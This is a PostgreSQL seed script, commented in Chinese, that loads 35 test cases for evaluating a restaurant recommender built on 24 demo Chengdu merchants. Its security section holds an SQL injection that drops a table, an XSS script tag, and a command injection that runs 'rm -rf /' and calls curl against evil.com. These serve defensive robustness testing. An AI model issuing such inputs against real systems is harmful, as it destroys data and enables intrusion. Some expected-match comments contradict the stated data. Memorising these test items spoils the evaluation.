BEGIN;

-- ============================================================
-- 1. 创建标准测试集
-- ============================================================
INSERT INTO recommendation_eval_datasets (id, name, description, data_version, status, created_by, created_at, updated_at)
VALUES (
    1,
    '探店推荐标准测试集 v2.0',
    '基于成都24家种子商户的探店推荐评测集。'
    '商户构成：6个区(锦江/青羊/武侯/成华/金牛/高新) × 4种菜系(川菜/火锅/粤菜/咖啡甜品)。'
    '价格区间32-124元，评分2.0-4.0，营业时间统一10:00-22:00。'
    '环境标签：川菜&粤菜→[明亮,交通便利]，火锅&咖啡甜品→[安静,适合聚餐]。'
    'DEMO-M-023(武侯粤菜)=SUSPENDED，DEMO-M-024(武侯咖啡甜品)=CLOSED_PERMANENTLY。'
    '包含普通问题(12)、模糊问题(6)、条件冲突(6)、无结果(6)、恶意输入(5)共35条案例。',
    '2.0.0',
    'ACTIVE',
    NULL,
    '2026-07-21 00:00:00+08',
    '2026-07-21 00:00:00+08'
)
ON CONFLICT (id) DO UPDATE SET
    name        = EXCLUDED.name,
    description = EXCLUDED.description,
    data_version = EXCLUDED.data_version,
    updated_at  = NOW();

-- ============================================================
-- 2. 插入标准测试案例
-- ============================================================

INSERT INTO recommendation_eval_cases (
    dataset_id, case_code, case_name, input_text,
    expected_constraints, location_snapshot, tags, sequence_no
) VALUES

-- ============================================================
-- 2.1 普通问题 (Normal Cases) — 条件合理，预期在种子数据中可找到匹配商户
-- ============================================================

-- REC-001: 单人川菜，成华区，预算50以内
-- 预期匹配: DEMO-M-001(成华川菜 32元 3.33分)
(1, 'REC-001', '单人川菜成华区',
 '我一个人想吃川菜，人均50以内，最好在成华区',
 '{
   "cuisines": ["川菜"],
   "partySize": 1,
   "perCapitaBudget": 50,
   "distanceKm": 5
 }'::jsonb,
 '{"latitude": 30.670, "longitude": 104.110, "region": "成都市成华区", "region_code": "CD-CH"}'::jsonb,
 '["normal", "cuisine", "budget", "region", "single"]'::jsonb, 1),

-- REC-002: 双人火锅，评分高
-- 预期匹配: DEMO-M-010(锦江火锅 68元 4.0分), DEMO-M-006(高新火锅 52元 3.33分)
(1, 'REC-002', '双人火锅高评分',
 '两个人想吃火锅，评分要高的，人均不超过80',
 '{
   "cuisines": ["火锅"],
   "partySize": 2,
   "perCapitaBudget": 80,
   "minRating": 4.0
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["normal", "cuisine", "budget", "rating", "couple"]'::jsonb, 2),

-- REC-003: 家庭聚餐粤菜，安静适合聚餐
-- 预期匹配: DEMO-M-007(高新粤菜 56元 安静适合聚餐), DEMO-M-019(青羊粤菜 104元 安静适合聚餐)
-- 注意: 粤菜 cidx=3 为奇数 → "明亮,交通便利", 但偶数索引才得"安静,适合聚餐"
-- 实际检查: 川菜cidx=1(odd→明亮), 火锅cidx=2(even→安静), 粤菜cidx=3(odd→明亮), 咖啡甜品cidx=4(even→安静)
-- 所以粤菜全是"明亮,交通便利"! 没有"安静,适合聚餐"的粤菜。
-- 此案例在DB中找不到同时满足cuisine=粤菜 + environment=安静的商户 → 实际属于"无结果"
-- 修正: 改为只要求粤菜+家庭聚餐场景，不限定环境
(1, 'REC-003', '家庭聚餐粤菜',
 '一家四口想吃粤菜，人均80到120，适合家庭聚餐的',
 '{
   "cuisines": ["粤菜"],
   "partySize": 4,
   "perCapitaBudget": 100,
   "scenes": ["家庭聚餐"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["normal", "cuisine", "budget", "scene", "family"]'::jsonb, 3),

-- REC-004: 朋友下午茶，咖啡甜品，交通便利
-- 预期匹配: 咖啡甜品 cidx=4(even) → "安静,适合聚餐"，没有"交通便利"的咖啡甜品
-- 修正: 咖啡甜品 + 安静 + 朋友聚会（符合实际标签）
(1, 'REC-004', '朋友下午茶咖啡甜品',
 '和朋友去喝下午茶，找一家咖啡甜品店，环境安静一点的',
 '{
   "cuisines": ["咖啡甜品"],
   "partySize": 3,
   "environmentRequirements": ["安静"],
   "scenes": ["朋友聚会"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["normal", "cuisine", "environment", "scene", "friends"]'::jsonb, 4),

-- REC-005: 锦江区火锅
-- 预期匹配: DEMO-M-010(锦江火锅 68元 4.0分)
(1, 'REC-005', '锦江区火锅',
 '锦江区有什么好吃的火锅店？人均70左右',
 '{
   "cuisines": ["火锅"],
   "perCapitaBudget": 70
 }'::jsonb,
 '{"latitude": 30.650, "longitude": 104.080, "region": "成都市锦江区", "region_code": "CD-JJ"}'::jsonb,
 '["normal", "cuisine", "region", "budget"]'::jsonb, 5),

-- REC-006: 武侯区中餐，评分高
-- 预期匹配: DEMO-M-021(武侯川菜 112元 3.33分), DEMO-M-023(武侯粤菜 SUSPENDED会被过滤)
(1, 'REC-006', '武侯区中餐高评分',
 '武侯区附近有什么好的中餐馆？评分3.0以上的',
 '{
   "merchantTypes": ["中餐"],
   "minRating": 3.0
 }'::jsonb,
 '{"latitude": 30.630, "longitude": 104.040, "region": "成都市武侯区", "region_code": "CD-WH"}'::jsonb,
 '["normal", "category", "rating", "region"]'::jsonb, 6),

-- REC-007: 金牛区，人均不超过80
-- 预期匹配: DEMO-M-013(金牛川菜 80元), DEMO-M-014(金牛火锅 84元 超出)
-- DeMO-M-013 80元 ≤ 80, 匹配
(1, 'REC-007', '金牛区人均80以内',
 '金牛区附近，人均不超过80块钱，随便什么菜系都行',
 '{
   "perCapitaBudget": 80,
   "distanceKm": 5
 }'::jsonb,
 '{"latitude": 30.700, "longitude": 104.055, "region": "成都市金牛区", "region_code": "CD-JN"}'::jsonb,
 '["normal", "budget", "region"]'::jsonb, 7),

-- REC-008: 成华区环境明亮
-- 成华区+明亮: DEMO-M-001(川菜 明亮), DEMO-M-003(粤菜 明亮)
(1, 'REC-008', '成华区明亮环境',
 '成华区有没有环境比较明亮的餐厅？两个人吃',
 '{
   "partySize": 2,
   "environmentRequirements": ["明亮"],
   "distanceKm": 5
 }'::jsonb,
 '{"latitude": 30.670, "longitude": 104.110, "region": "成都市成华区", "region_code": "CD-CH"}'::jsonb,
 '["normal", "environment", "region", "couple"]'::jsonb, 8),

-- REC-009: 青羊区适合聚餐
-- 青羊区+适合聚餐: DEMO-M-018(青羊火锅 100元 安静适合聚餐), DEMO-M-020(青羊咖啡甜品 108元 安静适合聚餐)
(1, 'REC-009', '青羊区聚餐',
 '五六个人想在青羊区聚餐，环境要适合聚餐的',
 '{
   "partySize": 5,
   "environmentRequirements": ["适合聚餐"],
   "scenes": ["朋友聚会"]
 }'::jsonb,
 '{"latitude": 30.675, "longitude": 104.060, "region": "成都市青羊区", "region_code": "CD-QY"}'::jsonb,
 '["normal", "environment", "region", "scene", "group"]'::jsonb, 9),

-- REC-010: 评分最高的川菜
-- 预期: DEMO-M-005(高新川菜 4.0分), DEMO-M-021(武侯川菜 3.33分), DEMO-M-001(成华川菜 3.33分)
(1, 'REC-010', '高评分川菜',
 '想吃评分最高的川菜馆，两个人',
 '{
   "cuisines": ["川菜"],
   "partySize": 2,
   "minRating": 3.5
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["normal", "cuisine", "rating", "couple"]'::jsonb, 10),

-- REC-011: 火锅安静环境
-- 火锅 cidx=2(even) → 全部是"安静,适合聚餐"，所以都能匹配
-- 预期匹配: 6家火锅全部
(1, 'REC-011', '火锅安静环境',
 '想吃火锅，环境要安静一点的，三个人，人均100以内',
 '{
   "cuisines": ["火锅"],
   "partySize": 3,
   "perCapitaBudget": 100,
   "environmentRequirements": ["安静"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["normal", "cuisine", "environment", "budget"]'::jsonb, 11),

-- REC-012: 高新区中餐
-- 预期: DEMO-M-005(高新川菜 48元 4.0分 明亮), DEMO-M-007(高新粤菜 56元 2.67分 明亮)
(1, 'REC-012', '高新区中餐',
 '去高新区办事，附近有什么中餐推荐？一个人吃工作餐，人均60以内',
 '{
   "merchantTypes": ["中餐"],
   "partySize": 1,
   "perCapitaBudget": 60
 }'::jsonb,
 '{"latitude": 30.560, "longitude": 104.070, "region": "成都市高新区", "region_code": "CD-GX"}'::jsonb,
 '["normal", "category", "budget", "region", "work_meal"]'::jsonb, 12),

-- ============================================================
-- 2.2 模糊问题 (Fuzzy Cases) — 条件不明确，测试系统的推理和默认值填充能力
-- ============================================================

-- REC-013: 极其模糊——零约束
(1, 'REC-013', '随便吃点',
 '随便吃点，你推荐一下吧',
 '{
   "scenes": ["随意用餐"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["fuzzy", "vague", "no_constraints"]'::jsonb, 13),

-- REC-014: 主观评价——"好吃"
(1, 'REC-014', '成都好吃的',
 '成都有什么好吃的餐厅推荐吗',
 '{
   "minRating": 3.5
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["fuzzy", "subjective", "general"]'::jsonb, 14),

-- REC-015: 模糊预算——"不太贵"
(1, 'REC-015', '不太贵的',
 '想吃不太贵的，两个人',
 '{
   "partySize": 2,
   "perCapitaBudget": 80
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["fuzzy", "budget", "vague"]'::jsonb, 15),

-- REC-016: 位置依赖——"附近"
(1, 'REC-016', '附近有什么',
 '我附近有什么好吃的？',
 '{
   "distanceKm": 5,
   "minRating": 3.0
 }'::jsonb,
 '{"latitude": 30.670, "longitude": 104.110, "region": "成都市成华区", "region_code": "CD-CH"}'::jsonb,
 '["fuzzy", "distance", "location_based"]'::jsonb, 16),

-- REC-017: 模糊环境——"环境好一点"
(1, 'REC-017', '环境好一点',
 '有没有环境好一点的餐厅？两三个人',
 '{
   "partySize": 2,
   "environmentRequirements": ["安静"],
   "minRating": 3.5
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["fuzzy", "environment", "vague"]'::jsonb, 17),

-- REC-018: 场景推理——"约会"
(1, 'REC-018', '适合约会的',
 '推荐个适合约会的餐厅，成都市区',
 '{
   "partySize": 2,
   "environmentRequirements": ["安静"],
   "scenes": ["约会"],
   "perCapitaBudget": 80,
   "minRating": 3.5
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["fuzzy", "scene", "subjective", "couple"]'::jsonb, 18),

-- ============================================================
-- 2.3 条件冲突 (Conflicting Cases) — 条件之间存在逻辑矛盾
-- ============================================================

-- REC-019: 概念矛盾——"素食" + "火锅"
(1, 'REC-019', '素食火锅',
 '想吃素食火锅，两个人',
 '{
   "cuisines": ["火锅"],
   "tasteRestrictions": ["素食"],
   "partySize": 2
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "cuisine", "taste", "contradiction"]'::jsonb, 19),

-- REC-020: 环境矛盾——"安静" + "热闹"
(1, 'REC-020', '安静又热闹',
 '想找一家环境既安静又热闹的餐厅，一个人',
 '{
   "partySize": 1,
   "environmentRequirements": ["安静", "热闹"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "environment", "contradiction"]'::jsonb, 20),

-- REC-021: 口味与菜系矛盾——"火锅" + "不辣"
(1, 'REC-021', '火锅不辣',
 '想吃火锅但是一点辣都不能吃，有这种店吗',
 '{
   "cuisines": ["火锅"],
   "tasteRestrictions": ["不吃辣"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "cuisine", "taste", "contradiction"]'::jsonb, 21),

-- REC-022: 场景与人数矛盾——"商务宴请" + "1人"
(1, 'REC-022', '单人商务宴请',
 '我一个人要商务宴请，人均200以上',
 '{
   "partySize": 1,
   "scenes": ["商务宴请"],
   "perCapitaBudget": 200
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "scene", "party_size", "contradiction"]'::jsonb, 22),

-- REC-023: 时间与品类矛盾——"早餐" + "凌晨"
(1, 'REC-023', '凌晨吃早餐',
 '凌晨2点想吃早餐，有油条豆浆那种',
 '{
   "merchantTypes": ["早餐"],
   "businessTime": "LATE_NIGHT",
   "businessTargetTime": "02:00"
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "business_hours", "category", "contradiction"]'::jsonb, 23),

-- REC-024: 价格与品质矛盾——"免费" + "高档"
(1, 'REC-024', '免费高档餐厅',
 '有没有免费的高档餐厅，评分还要4.5以上的',
 '{
   "perCapitaBudget": 0,
   "minRating": 4.5
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["conflict", "budget", "rating", "contradiction"]'::jsonb, 24),

-- ============================================================
-- 2.4 无结果 (No Result Cases) — 条件各自合理，但DB中无匹配商户
-- ============================================================

-- REC-025: 菜系不存在——"日料"
-- DB中只有川菜/火锅/粤菜/咖啡甜品，没有日料
(1, 'REC-025', '日料推荐',
 '想吃日料，人均100左右，两个人',
 '{
   "cuisines": ["日料"],
   "partySize": 2,
   "perCapitaBudget": 100
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["no_result", "cuisine", "nonexistent", "empty"]'::jsonb, 25),

-- REC-026: 预算超上限——人均200
-- DB川菜最高112元(武侯区)，没有≥200的
(1, 'REC-026', '人均200川菜',
 '想吃川菜，人均200以上，要高档的',
 '{
   "cuisines": ["川菜"],
   "perCapitaBudget": 200
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["no_result", "budget", "exceeds_max", "empty"]'::jsonb, 26),

-- REC-027: 评分超上限——4.8
-- DB最高评分是4.0
(1, 'REC-027', '评分4.8火锅',
 '想吃评分4.8以上的火锅，人均不限',
 '{
   "cuisines": ["火锅"],
   "minRating": 4.8
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["no_result", "rating", "exceeds_max", "empty"]'::jsonb, 27),

-- REC-028: 营业时间外——凌晨2点
-- 全部商户营业时间 10:00-22:00
(1, 'REC-028', '凌晨火锅',
 '凌晨2点想吃火锅，成都市区',
 '{
   "cuisines": ["火锅"],
   "businessTime": "LATE_NIGHT",
   "businessTargetTime": "02:00"
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["no_result", "business_hours", "late_night", "empty"]'::jsonb, 28),

-- REC-029: 已停业商户——武侯区粤菜
-- DEMO-M-023 武侯区粤菜 operation_status = SUSPENDED
(1, 'REC-029', '武侯区粤菜已停业',
 '武侯区有没有粤菜馆？',
 '{
   "cuisines": ["粤菜"]
 }'::jsonb,
 '{"latitude": 30.630, "longitude": 104.040, "region": "成都市武侯区", "region_code": "CD-WH"}'::jsonb,
 '["no_result", "operation_status", "suspended", "empty"]'::jsonb, 29),

-- REC-030: 交叉条件无匹配——火锅+交通便利
-- 所有火锅 cidx=2(even) → 标签统一为["安静","适合聚餐"]
-- 没有"交通便利"的火锅
(1, 'REC-030', '交通便利火锅',
 '想吃火锅，要交通便利的那种，一个人',
 '{
   "cuisines": ["火锅"],
   "partySize": 1,
   "environmentRequirements": ["交通便利"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["no_result", "cuisine", "environment", "cross_filter", "empty"]'::jsonb, 30),

-- ============================================================
-- 2.5 恶意输入 (Malicious Cases) — 安全与鲁棒性测试
-- ============================================================

-- REC-031: SQL 注入
(1, 'REC-031', 'SQL注入攻击',
 '川菜; DROP TABLE merchants; --',
 '{
   "cuisines": ["川菜"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["malicious", "sql_injection", "security"]'::jsonb, 31),

-- REC-032: XSS 攻击
(1, 'REC-032', 'XSS攻击',
 '<script>alert("xss")</script>火锅推荐',
 '{
   "cuisines": ["火锅"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["malicious", "xss", "security"]'::jsonb, 32),

-- REC-033: 超长输入
(1, 'REC-033', '超长输入',
 '我想吃川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜川菜',
 '{
   "cuisines": ["川菜"]
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["malicious", "long_input", "robustness"]'::jsonb, 33),

-- REC-034: 特殊 Unicode 字符
(1, 'REC-034', '特殊Unicode字符',
 '想吃🍲🌶️ 火锅 ​ 人均80',
 '{
   "cuisines": ["火锅"],
   "perCapitaBudget": 80
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["malicious", "unicode", "emoji", "robustness"]'::jsonb, 34),

-- REC-035: 命令注入
(1, 'REC-035', '命令注入',
 '川菜 $(rm -rf /) 或者 && curl evil.com 人均50',
 '{
   "cuisines": ["川菜"],
   "perCapitaBudget": 50
 }'::jsonb,
 '{"latitude": 30.575, "longitude": 104.065, "region": "成都市", "region_code": "CD"}'::jsonb,
 '["malicious", "command_injection", "security"]'::jsonb, 35)

ON CONFLICT (dataset_id, case_code) DO UPDATE SET
    case_name            = EXCLUDED.case_name,
    input_text           = EXCLUDED.input_text,
    expected_constraints = EXCLUDED.expected_constraints,
    location_snapshot    = EXCLUDED.location_snapshot,
    tags                 = EXCLUDED.tags,
    sequence_no          = EXCLUDED.sequence_no,
    updated_at           = NOW();

-- ============================================================
-- 3. 同步序列
-- ============================================================
SELECT setval('recommendation_eval_cases_id_seq',
    (SELECT COALESCE(MAX(id), 1) FROM recommendation_eval_cases));

-- ============================================================
-- 4. 版本记录
-- ============================================================
DO $$
BEGIN
    IF NOT EXISTS (
        SELECT 1 FROM information_schema.tables
        WHERE table_name = 'recommendation_eval_version_log'
    ) THEN
        CREATE TABLE recommendation_eval_version_log (
            id              BIGSERIAL PRIMARY KEY,
            dataset_id      BIGINT NOT NULL,
            version         VARCHAR(50) NOT NULL,
            change_summary  TEXT NOT NULL,
            changed_by      VARCHAR(100),
            changed_at      TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,

            CONSTRAINT fk_eval_version_log_dataset
                FOREIGN KEY (dataset_id)
                REFERENCES recommendation_eval_datasets(id)
                ON DELETE CASCADE
        );
    END IF;
END $$;

-- 记录 v2.0 版本
INSERT INTO recommendation_eval_version_log (dataset_id, version, change_summary, changed_by, changed_at)
VALUES (
    1,
    '2.0.0',
    '全面重写 — 基于项目实际24家成都种子商户。'
    '修正要点：(1)坐标从北京改为成都各城区(30.5-30.7N,104.0-104.1E)；'
    '(2)菜系从西餐/日料/烧烤等改为实际存在的川菜/火锅/粤菜/咖啡甜品；'
    '(3)预算从200-1000改为实际区间32-124；'
    '(4)环境标签从包间/浪漫/户外改为实际的明亮/交通便利/安静/适合聚餐；'
    '(5)营业时间统一为10:00-22:00，深夜/早餐案例改为"无结果"；'
    '(6)利用DEMO-M-023(SUSPENDED)和DEMO-M-024(CLOSED_PERMANENTLY)测试运营状态过滤；'
    '(7)利用火锅全部为"安静,适合聚餐"的特点设计交叉过滤无结果案例；'
    '(8)expected_constraints字段名对齐ConstraintState Java类(cuisines/perCapitaBudget/partySize/minRating等)。',
    'test_designer',
    '2026-07-21 00:00:00+08'
);

COMMIT;
